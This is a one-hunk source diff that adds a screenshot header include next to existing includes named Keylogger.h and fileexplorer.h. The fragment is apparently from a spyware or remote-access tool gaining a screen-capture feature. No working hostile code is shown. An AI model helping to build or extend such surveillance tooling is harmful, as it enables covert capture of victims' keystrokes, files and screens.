@@ -5,3 +5,4 @@
 #include "info.h"
 #include "Keylogger.h"
 #include "fileexplorer.h"
+#include "screenshot.h"
